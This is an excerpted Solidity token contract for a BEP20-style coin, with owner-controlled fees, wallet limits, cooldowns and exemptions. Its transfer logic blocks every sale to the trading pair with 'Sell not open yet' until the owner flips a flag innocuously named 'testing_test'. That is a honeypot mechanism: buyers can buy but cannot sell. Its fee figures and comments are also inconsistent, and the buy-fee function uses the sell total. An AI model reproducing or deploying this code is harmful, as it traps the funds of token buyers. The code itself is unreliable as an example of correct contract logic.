...
/**
TRADING ETH.SOL / isTxLimitExempt
*/
...
contract Token is IBEP20, Auth {
    ...
    uint256 public _maxWalletAmount = 10 * 10**9 * (10 ** _decimals); //2% of total supply
    uint256 public _maxBuyTxAmount = 10 * 10**9 * (10 ** _decimals); //1% of total supply
    uint256 public _maxSellTxAmount = 2 * 10**9 * (10 ** _decimals); //0.5%% of total supply
    ...
    uint256 buyreflectionFee   = 30;
    uint256 buymarketingFee    = 5;
    uint256 public totalFeeBuy = 38;
    uint256 buyfeeDenominator  = 100;
 
    uint256 sellliquidityFee    = 3;
    uint256 sellreflectionFee   = 30;
    ...
    bool public testing_test = false;
    ...
    uint8 public sellcooldownInterval = 240;
 
    bool public swapEnabled = true;
    uint256 public swapThreshold = 2 * 10**9 * (10 ** _decimals); // 0.02% of total supply
    bool inSwap;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x9E6c32B09e7117aCc640C745b840b2D497594B06;
    ...
    function testing_testStatus(bool _status) public onlyOwner {
        testing_test = _status;
    }
    ...
    function setIsAllExempt(address holder, bool _status) external authorized {
    ...
    function cooldownEnabled(bool _buystatus, bool _sellstatus, uint8 _buyinterval, uint8 _sellinterval) public onlyOwner {
        ...
        sellcooldownInterval = _sellinterval;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(recipient == pair && sellCooldownEnabled && !authorizations[sender] && !isTimelockExempt[sender]){
                ...
                sellcooldown[sender] = block.timestamp + sellcooldownInterval;
        }
        ...
        if(recipient == pair) {
            ...
            require(testing_test, "Sell not open yet");
        }
    ...
    function takeBuyFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 buyfeeAmount = amount.mul(totalFeeSell).div(buyfeeDenominator);
